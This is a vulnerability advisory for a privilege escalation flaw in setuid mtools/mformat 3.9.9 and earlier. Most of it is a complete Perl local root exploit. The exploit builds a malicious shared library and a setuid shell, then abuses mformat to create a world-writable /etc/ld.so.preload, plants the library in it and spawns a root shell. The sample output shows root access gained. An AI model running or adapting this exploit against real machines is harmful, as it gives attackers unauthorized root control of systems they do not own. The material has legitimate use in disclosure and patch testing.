source: http://www.securityfocus.com/bid/9746/info

It has been reported that mformat is prone to a privilege escalation vulnerability when installed as a setUID application. This issue is due to a design error allowing a user to create any arbitrary files as the root user.

A local attacker could exploit this issue by forcing the creation of sensitive system files that already exist. When the application formats the specified files, the target system file will be overwritten, destroying sensitive system data. Since the files that are given permissions 0666 and owned by root, the attacker may alter overwritten system configuration files, allowing for a escalation of privileges.

#!/usr/bin/perl

#
# mtools/mformat <= 3.9.9 local root exploit.
# Successfully tested on a Mandrake 9.2 default install.
# (C) 2004 krahmer@cs.uni-potsdam.de. PoC code.
# Standard disclaimer applies. Do not use for evil purposes.
#
# !USE AT YOUR OWN RISK! IT MAY CRASH YOUR MACHINE!
#
# If something goes wrong, it helps to be logged in as root
# on a second terminal beforehand and then doing a cat > /etc/ld.so.preload
#
# [stealth@lachs stealth]$ ./macker
# [-] Checking for mformat being +s ...OK.
# [-] Creating funky.so ...OK.
# [-] Creating boomsh ...OK
# [-] Calling mformat...
# [-] Invoking boomsh ...
# sh-2.05b# id
# uid=0(root) gid=501(stealth) groups=501(stealth)
# sh-2.05b#
 
$ |= 1;
umask(0);

print " [-] Checking for mformat being +s ...";
if (((stat("/usr/bin/mformat"))[2] & 04000) != 04000) {
	print "mformat not SUID.\n";
	exit(1);
}

print "OK.\n [-] Creating funky.so ...";

open(O, ">/tmp/funky.c") or die "$!";
print O<<_EOF_;
void _init()
{
	chown("/tmp/boomsh",0,0);
	chmod("/tmp/boomsh", 04755);
	unlink("/etc/ld.so.preload");
}
_EOF_
close(O);
if (system("cc -c -fPIC /tmp/funky.c -o /tmp/funky.o &&".
	   "ld -Bshareable /tmp/funky.o -o /tmp/funky.so")) {
	print "FAILED!";
	exit(1);
}

print "OK.\n [-] Creating boomsh ...";

open(O, ">/tmp/boomsh.c") or die "$!";
print O<<_EOF_;
#include <stdio.h>
int main()
{
char *a[]={"/bin/sh", NULL};
setuid(0); getuid(0);
execve(*a,a,NULL);
return 1;
}
_EOF_
close(O);

if (system("cc /tmp/boomsh.c -o /tmp/boomsh")) {
	print "FAILED!\n";
	exit(1);
}

print "OK\n";
print " [-] Calling mformat...\n";

open(O, ">".$ENV{HOME}."/.mtoolsrc") or die $!;
print O "drive+ a: file=\"/etc/ld.so.preload\"\n";
close(O);
system("/usr/bin/mformat -t 11 -h 1 -n 1 -C a:");

open(O, ">/etc/ld.so.preload") or die "Oh oh ... $!";
print O "/tmp/funky.so\n";
close(O);
system("ping 2>/dev/null");
print " [-] Invoking boomsh ...\n";
exec("/tmp/boomsh");
print "FAILED\n";